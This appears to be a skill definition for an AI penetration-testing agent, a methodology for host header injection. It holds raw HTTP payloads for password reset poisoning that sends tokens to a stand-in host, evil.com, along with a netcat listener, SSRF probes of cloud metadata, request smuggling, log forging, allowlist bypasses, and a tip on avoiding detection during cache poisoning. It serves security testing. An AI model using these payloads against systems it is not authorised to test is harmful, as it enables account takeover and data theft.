---
name: host-header-injection
description: "Host Header Injection exploitation for password reset poisoning, cache poisoning, and SSRF"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, followRedirects, recordEvidence, getCapturedHeaders]
triggers: ["host header injection", "host header attack", "password reset poisoning", "host header ssrf", "server name injection", "virtual host", "host header manipulation", "host header", "server header", "absolute url host"]
contextBoosts: [auth]
mitreAttack: ["T1190", "T1566"]
owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration"]
---

# Host Header Injection

Host header injection occurs when a server trusts the `Host` HTTP header without validation, allowing an attacker to influence application behavior — including URL generation, routing, caching, and email content. This is a server-side trust boundary violation that can escalate into password reset poisoning, cache poisoning, SSRF, and request smuggling.

## When to Use / Do Not Use

### Use When
- Target generates absolute URLs using the `Host` header (password reset links, redirect URIs, canonical URLs)
- Target sits behind a reverse proxy or CDN that forwards `X-Forwarded-Host`
- Target uses virtual hosting (multiple domains on one IP)
- Password reset, email verification, or OAuth redirect flows are present
- You observe cache behavior that varies by `Host` or `X-Forwarded-Host` values
- Target returns different content based on hostname (e.g., admin vs. public)

### Do Not Use When
- Target strictly validates `Host` against an allowlist and rejects mismatches
- Application generates all URLs from configuration, never from request headers
- Target returns `400 Bad Request` for every malformed `Host` value
- Host header is not reflected in any response, URL, or out-of-band channel
- Infrastructure (load balancer, WAF) rewrites the `Host` header before it reaches the application

## Auth Context

Host header injection is most critical in authentication flows:

- **Password reset tokens** are often embedded in links built from the `Host` header — if you control the Host, you control where the token is sent
- **OAuth callback URLs** may use the Host header to construct the redirect URI, enabling token theft
- **Session cookies** scoped to `.example.com` can be set for a poisoned domain if the backend trusts the Host
- **JWT `iss` claims** may derive from the Host header, allowing forged issuer values
- Always check auth-related endpoints first: password reset, registration confirmation, magic links, OAuth authorize

## Host Header Detection

Baseline test — send a request with a non-standard Host and observe whether the server accepts it.

**Test with different Host values:**

```
GET / HTTP/1.1
Host: completely-unknown-host.example.com
```

**Indicators of acceptance:**
- Server returns `200 OK` instead of `400` or `404`
- Response contains a `Location` header referencing the injected host
- Page content renders URLs with the injected hostname
- Server includes the injected value in `Content-Security-Policy`, `Set-Cookie` `Domain`, or canonical link tags

**Test progression:**

| Step | Host Value | Purpose |
|------|-----------|---------|
| 1 | `target.com` | Baseline — normal behavior |
| 2 | `evil.com` | Does server accept arbitrary host? |
| 3 | `target.com.evil.com` | Subdomain confusion |
| 4 | `evil.com%0d%0aX-Injected: true` | Header injection via Host |
| 5 | `target.com:443` | Port variation — does backend normalize? |
| 6 | `target.com ` (trailing space) | Whitespace handling |
| 7 | `TARGET.COM` | Case sensitivity |

**Response analysis:**
- Check `Location` headers for the injected hostname
- Check `Link` headers or canonical tags for reflected host
- Check if cookies are set with `Domain` matching the injected value
- Check if rendered JavaScript contains the injected host in any URL construction

## Password Reset Poisoning

The most impactful host header injection vector. When a password reset email contains a link built from the `Host` header, an attacker can redirect the reset token to their own server.

**Attack flow:**
1. Submit a password reset request for a victim's email
2. Intercept the request and modify the `Host` header to `evil.com`
3. The server sends a password reset email containing `https://evil.com/reset?token=REAL_TOKEN`
4. Victim clicks the link — token is sent to attacker's server
5. Attacker uses the token to reset the victim's password

**Injection points for the Host header:**
- Direct `Host` header manipulation
- `X-Forwarded-Host` header (if proxy chain is present)
- `X-Host` header
- `X-Real-IP` combined with Host (rare)
- `Forwarded: host=evil.com` (RFC 7239)

**Test procedure:**

```
POST /api/forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/json

{"email": "victim@example.com"}
```

Then monitor your server (e.g., using `nc -lvnp 80` or Burp Collaborator) for the incoming request with the reset token.

**What to verify:**
- Does the reset email URL contain `evil.com` as the domain?
- Does the token in the URL match the one the server generated?
- Are there alternative URL construction methods (e.g., `app.get('host')` vs. `config.baseURL`)?
- Does the application use a `BASE_URL` config that overrides the Host header?

## Cache Poisoning via Host

If the server uses the `Host` header (or `X-Forwarded-Host`) as part of the cache key, you can poison the cache by injecting a malicious host value.

**Cache poisoning via Host:**

```
GET /page HTTP/1.1
Host: evil.com
```

If the cache stores this response keyed by `evil.com`, then any legitimate user who requests `/page` with `Host: evil.com` (or is routed via a poisoned DNS entry) receives the attacker's content.

**Cache poisoning via X-Forwarded-Host:**

```
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

Some CDNs use `X-Forwarded-Host` as a cache key component. If the CDN caches the response for `X-Forwarded-Host: evil.com` but the backend processes `Host: target.com`, you get a cache key mismatch.

**Detection:**
- Send requests with varying `X-Forwarded-Host` values
- Check if responses change (different content, different `ETag`, different `Vary` headers)
- If `Vary: Host` is present, cache poisoning via Host may be possible
- If no `Vary` header, cache poisoning is more likely
- Check `Cache-Control` headers for `s-maxage`, `public`, or `no-cache` directives

**Exploitation:**
- Inject JavaScript or iframe in the cached response
- Target authenticated users whose cache entries share the poisoned key
- Use short TTLs to minimize detection

## SSRF via Host

When the backend uses the `Host` header to construct internal URLs or route requests, injecting an internal hostname can cause server-side request forgery.

**Direct SSRF via Host:**

```
GET / HTTP/1.1
Host: internal-admin-panel
```

If the backend constructs URLs like `http://{Host}/api/data` for internal calls, this routes to the internal service.

**SSRF via Host header in absolute URL:**

```
GET http://internal-service/ HTTP/1.1
Host: target.com
```

Some HTTP parsers treat the request line as the authority when it contains an absolute URL, while others use the `Host` header. This discrepancy can bypass URL validation.

**SSRF via X-Forwarded-Host:**

```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: metadata.google.internal
```

**Targets to probe:**
- `169.254.169.254` (cloud metadata endpoint)
- `internal-admin-panel` or `admin.internal`
- `localhost`, `127.0.0.1`, `[::1]`
- Internal DNS names (e.g., `db.internal`, `redis.internal`)
- Other microservices on the same network

## Web Cache Deception

Host-based routing differences between the cache layer and the backend can be exploited to cache sensitive content under a public URL.

**Attack:**
1. Identify a URL that returns sensitive content for one Host but public content for another
2. Request the URL with the "sensitive" Host value, but include cache-busting parameters
3. If the cache serves the response based on the path (ignoring Host), the sensitive content is cached
4. Other users request the same path and receive the cached sensitive content

**Example:**

```
GET /account/settings HTTP/1.1
Host: admin.internal
X-Forwarded-Host: target.com
```

If the backend resolves `admin.internal` and returns admin settings, but the CDN caches it under `target.com`, public users receive admin content.

## Double Host Header

Sending two `Host` headers tests which one the backend trusts.

```
GET / HTTP/1.1
Host: target.com
Host: evil.com
```

**Possible outcomes:**
- **First wins**: Backend uses `target.com`, `evil.com` is ignored — no injection
- **Last wins**: Backend uses `evil.com` — full injection possible
- **Error**: Server returns `400 Bad Request` — both are processed, rejection triggered
- **Proxy split**: Proxy uses first, backend uses second — inconsistent behavior

**Variations:**
```
Host: target.com, evil.com
Host: target.com; evil.com
Host: target.com\ evil.com
Host: target.com%20evil.com
```

## HTTP Request Smuggling via Host

Host header conflicts between a front-end proxy and a back-end server can enable request smuggling.

**CL.TE via Host:**

```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

If the proxy processes `Host: target.com` and the backend processes `Host: evil.com`, the backend may route the smuggled `G` request to a different virtual host.

**TE.CL via Host:**

```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0
```

**Host header splitting:**

```
GET / HTTP/1.1
Host: target.com%0d%0aContent-Length: 3%0d%0a%0d%0aG
```

If the server does not validate the Host header for CRLF characters, this can split the request into two separate requests.

## Log Injection

Injecting newline characters into the Host header can forge entries in server logs.

```
GET / HTTP/1.1
Host: target.com%0d%0a[FAKE] Admin login from 10.0.0.1
```

**Impact:**
- Forge log entries to confuse incident response
- Inject fake timestamps or IP addresses
- Trigger log analysis alerts with false positives
- Poison log aggregation systems (Splunk, ELK)

**Variations:**
```
Host: target.com%0a[INJECTED] SQL query failed
Host: target.com%0d%0a%0d%0a<HTML>Injected content</HTML>
```

## Allowed Host Bypass

If the server validates the `Host` header against an allowlist, test bypass techniques.

**Encoding bypasses:**
```
Host: target.com%2e%2e  (URL-encoded dot)
Host: target.com%00     (null byte)
Host: target.com%20     (space)
Host: target.com%09     (tab)
```

**Case bypass:**
```
Host: TARGET.COM
Host: tArGeT.cOm
```

**Whitespace bypass:**
```
Host: target.com
Host:  target.com   (leading/trailing spaces)
Host: target.com:   (trailing colon, no port)
```

**Alternative header bypass:**
```
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Real-Host: evil.com
Forwarded: host=evil.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

**Domain confusion:**
```
Host: target.com.evil.com
Host: evil.com?target.com
Host: evil.com#target.com
Host: target.com@evil.com
Host: target.com\.evil.com
```

## Anti-Hallucination

**Do NOT claim injection succeeded without evidence.** Each finding must be backed by verifiable proof.

### Evidence Required for Each Vector

**Password Reset Poisoning:**
- HTTP request showing modified Host header
- Email content (or server log) showing the reset URL contains the injected host
- Confirmation that the reset token in the poisoned URL is valid

**Cache Poisoning:**
- HTTP request with poisoned Host/X-Forwarded-Host
- HTTP response showing `Cache-Control`, `ETag`, or `Age` headers indicating caching
- Subsequent request from a different client receiving the poisoned content

**SSRF:**
- HTTP request with Host set to internal hostname
- Response containing data that could only come from the internal service
- Or: Out-of-band callback received at the injected host

**Double Host:**
- Raw HTTP request showing both Host headers
- Response showing which Host was processed (URL in body, redirect target, etc.)

**Log Injection:**
- HTTP request with CRLF in Host header
- Server log showing the injected content

**Allowed Host Bypass:**
- HTTP request with malformed/encoded Host
- Response showing the request was processed (200 OK, not 400/403)

### False Positive Scenarios

- Server returns `200 OK` for any Host — this is acceptance, not necessarily exploitable
- `X-Forwarded-Host` is logged but not used for URL generation — no poisoning possible
- Cache ignores Host header entirely — no cache poisoning
- Host header is reflected in an error page but not in any actionable context
- Internal service returns a generic error — SSRF exists but no data exfiltration possible
- Password reset email uses a hardcoded `BASE_URL` — Host injection has no effect

### What NOT to Claim

- "Host header injection confirmed" without showing where the injected value is used
- "Cache poisoning possible" without demonstrating actual cache behavior
- "SSRF achieved" without proof the internal service was reached
- "Password reset poisoned" without the email or callback containing the token
- "Request smuggling possible" without demonstrating two requests processed as one
